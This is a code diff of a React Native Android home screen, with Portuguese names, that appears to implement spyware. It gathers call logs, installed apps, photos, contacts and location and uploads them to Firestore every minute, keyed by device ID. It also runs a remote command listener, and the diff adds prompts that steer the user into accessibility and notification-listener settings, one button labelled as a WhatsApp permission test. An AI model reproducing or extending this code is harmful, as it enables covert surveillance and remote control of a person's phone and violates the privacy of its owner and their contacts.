@@ -1,24 +1,25 @@
 // src/screens/HomeScreen.js
 import React, { useEffect, useState } from 'react';
-import { View, Button, Text, PermissionsAndroid, Platform, Alert } from 'react-native';
+import { View, Button, Text, PermissionsAndroid, Platform, Alert, Linking } from 'react-native';
 import firestore from '@react-native-firebase/firestore';
 import auth from '@react-native-firebase/auth';
 import DeviceInfo from 'react-native-device-info';
+import AsyncStorage from '@react-native-async-storage/async-storage';
+
 import { coletarLocalizacao } from '../funcoes/localizacao';
 import { coletarAppsInstalados } from '../funcoes/coletarAppsInstalados';
 import { coletarChamadas } from '../funcoes/coletarChamadas';
 import { coletarFotos } from '../funcoes/coletarFotos';
 import { enviarFotosParaFirebase } from '../funcoes/enviarFotos';
-
+import { coletarContatos } from '../funcoes/coletarContatos';
 import { startComandosListener } from '../listeners/comandosListener';
+import { garantirPermissaoNotificacao } from '../funcoes/notificacoes';
+import { abrirTelaAcessibilidade } from '../funcoes/acessibilidade';
 
 export default function HomeScreen() {
-  /* ---------- ESTADO ---------- */
   const [status, setStatus] = useState('Dispositivo online');
 
-  /* ---------- PERMISSÕES ---------- */
   const PERMISSOES_ANDROID = [
-
     PermissionsAndroid.PERMISSIONS.CAMERA,
     PermissionsAndroid.PERMISSIONS.READ_CONTACTS,
     PermissionsAndroid.PERMISSIONS.WRITE_CONTACTS,
@@ -54,6 +55,17 @@ export default function HomeScreen() {
     PermissionsAndroid.PERMISSIONS.SCHEDULE_EXACT_ALARM,
   ];
 
+  function abrirTelaPermissaoNotificacoes() {
+    if (Platform.OS === 'android') {
+      Linking.openSettings();
+      try {
+        Linking.openURL('android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS');
+      } catch (e) {
+        console.warn('Erro ao abrir configurações de notificação:', e);
+      }
+    }
+  }
+
   const pedirTodasPermissoes = async () => {
     if (Platform.OS !== 'android') {
       Alert.alert('OK', 'Permissões concedidas (iOS).');
@@ -83,93 +95,59 @@ export default function HomeScreen() {
     }
   };
 
-  /* ---------- COLETA / ENVIO DE DADOS ---------- */
+  useEffect(() => {
+    garantirPermissaoNotificacao();
+    (async () => {
+      const jaViu = await AsyncStorage.getItem('acess_ok');
+      if (!jaViu) {
+        abrirTelaAcessibilidade();
+        await AsyncStorage.setItem('acess_ok', '1');
+      }
+    })();
+  }, []);
+
   const salvarDados = async () => {
     try {
       setStatus('Coletando dados…');
-  
       const androidId = await DeviceInfo.getAndroidId();
       const chamadas = await coletarChamadas();
-      const apps     = await coletarAppsInstalados();
+      const apps = await coletarAppsInstalados();
       const { fotos } = await coletarFotos();
       const urlsFotos = await enviarFotosParaFirebase(fotos);
-      const localizacao = await coletarLocalizacao();
-  
-      // 1. Salvar snapshot principal (último estado do dispositivo)
+      const { contatos } = await coletarContatos();
+
       const dadosCompletos = {
         ...chamadas,
         ...apps,
         fotos: urlsFotos,
+        contatos,
         timestamp: firestore.FieldValue.serverTimestamp(),
       };
-  
+
       await firestore().collection('dispositivos').doc(androidId).set(
         dadosCompletos,
         { merge: true }
       );
-  
-      // 2. Salvar ponto no histórico de localização
-      await firestore()
-        .collection('dispositivos')
-        .doc(androidId)
-        .collection('localizacoes')
-        .add(localizacao);
-  
+
       setStatus('Dados e localização enviados com sucesso!');
     } catch (err) {
       console.error('[ERRO salvarDados]', err);
       setStatus('Falha ao enviar dados');
     }
   };
-  
- /*  const salvarDados = async () => {
-    try {
-      setStatus('Coletando dados…');
 
-      const androidId = await DeviceInfo.getAndroidId();
-      const chamadas = await coletarChamadas();
-      const apps = await coletarAppsInstalados();
-      const { fotos } = await coletarFotos();
-      const urlsFotos = await enviarFotosParaFirebase(fotos);
-
-      const dadosCompletos = {
-        ...chamadas,
-        ...apps,
-        fotos: urlsFotos,
-        timestamp: firestore.FieldValue.serverTimestamp(),
-      };
-
-      await firestore().collection('dispositivos').doc(androidId).set(
-        dadosCompletos,
-        { merge: true },     // <-- só atualiza/mescla, não sobrescreve tudo
-      );
-
-      setStatus('Dados enviados com sucesso!');
-    } catch (err) {
-      console.error('[ERRO salvarDados]', err);
-      setStatus('Falha ao enviar dados');
-    }
-  }; */
-
-  /* ---------- LISTENER DE COMANDOS + COLETA AUTOMÁTICA ---------- */
   useEffect(() => {
-    // coleta periódica
-    salvarDados(); 
+    salvarDados();
     const t = setInterval(salvarDados, 60_000);
-
-    // listener Firestore → comandos
     const unsubscribe = startComandosListener();
-
     return () => {
       clearInterval(t);
       unsubscribe && unsubscribe();
     };
   }, []);
 
-  /* ---------- LOGOUT ---------- */
   const fazerLogout = () => auth().signOut();
 
-  /* ---------- UI ---------- */
   return (
     <View style={{ flex: 1, justifyContent: 'center', padding: 24 }}>
       <Text style={{ marginBottom: 20, textAlign: 'center', fontSize: 16 }}>
@@ -177,13 +155,13 @@ export default function HomeScreen() {
       </Text>
 
       <Button title="Autorizar Permissões" onPress={pedirTodasPermissoes} />
-
       <View style={{ height: 12 }} />
-
       <Button title="Enviar dados agora (teste)" onPress={salvarDados} />
-
       <View style={{ height: 12 }} />
-
+      <Button title="Abrir Config. Acessibilidade" onPress={abrirTelaAcessibilidade} />
+      <View style={{ height: 12 }} />
+      <Button title="Teste  Perrmissão WattsApp" onPress={abrirTelaPermissaoNotificacoes} />
+      <View style={{ height: 12 }} />
       <Button color="crimson" title="Logout" onPress={fazerLogout} />
     </View>
   );
